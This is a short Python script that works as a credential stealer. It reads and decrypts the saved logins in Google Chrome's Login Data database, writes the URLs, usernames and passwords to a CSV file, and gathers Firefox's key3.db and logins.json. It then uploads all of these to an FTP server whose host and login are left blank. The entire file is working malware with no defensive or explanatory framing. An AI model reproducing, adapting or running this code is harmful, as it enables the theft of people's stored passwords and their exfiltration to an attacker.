import ftplib
import os
import sqlite3
import win32crypt

ftp_host = ""
ftp_user = ""
ftp_pass = ""

fname	 = os.getenv('localappdata')+ '\\Google\\Chrome\\User Data\\Default\\Login Data'
f = ftplib.FTP(ftp_host)
info_list = []

if os.path.exists(fname) :

	connection = sqlite3.connect(fname)
	with connection:
		cursor = connection.cursor()
		v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		value = v.fetchall()
	for information in value:
		if os.name == 'nt':
			password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
			if password:
				info_list.append({
					'origin_url': information[0],
					'username': information[1],
					'password': str(password)
				})

chromepass = os.environ['APPDATA']
with open(chromepass + '\chromepass.csv', 'wb') as csv_file:
        for data in info_list :
            csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
			
f.login(ftp_user,ftp_pass)			
f.set_pasv(1)		
for curr, dirs, filess in os.walk(os.environ['APPDATA']):
			for file in filess :
				if (file == "key3.db" or file == "logins.json") :
					c = '%s/%s' % (curr, file)
					f.storbinary("STOR " + file , open(c, "rb"))
f.storbinary("STOR chromepass.csv", open(chromepass + "\chromepass.csv", "rb"))
f.close()
